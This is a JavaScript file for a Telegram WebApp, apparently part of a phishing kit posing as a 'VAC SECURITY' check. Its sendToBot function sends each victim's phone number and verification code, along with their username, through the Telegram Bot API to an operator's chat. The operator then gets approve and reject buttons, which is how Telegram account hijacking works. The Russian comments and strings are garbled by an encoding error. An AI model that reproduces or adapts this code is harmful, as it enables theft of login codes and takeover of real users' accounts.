// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è (–∑–∞–º–µ–Ω–∏—Ç—Å—è –ø—Ä–∏ —Å–±–æ—Ä–∫–µ)
const config = {
    botToken: '%%BOT_TOKEN%%',
    adminId: '%%ADMIN_ID%%',
    baseUrl: '%%BASE_URL%%'
};

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–Ω–æ–ø–∫–∞–º–∏
window.sendToBot = async (type, data) => {
    try {
        const tg = window.Telegram.WebApp;
        const user = tg.initDataUnsafe.user || {};
        
        let message = '';
        let buttons = [];
        
        if (type === 'phone') {
            message = `üì± –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @${user.username || '–±–µ–∑ username'} –≤–≤–µ–ª –Ω–æ–º–µ—Ä: <code>${data}</code>`;
        } else if (type === 'code') {
            message = `üî¢ –ö–æ–¥ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏: <code>${data}</code>\n–û—Ç: @${user.username || '–±–µ–∑ username'}`;
            buttons = [
                [
                    { text: "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", url: `${config.baseUrl}/yes/index.html` },
                    { text: "‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", url: `${config.baseUrl}/no/index.html` }
                ]
            ];
        }
        
        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.adminId,
                text: `üîê VAC SECURITY\n\n${message}`,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: buttons }
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
    }
};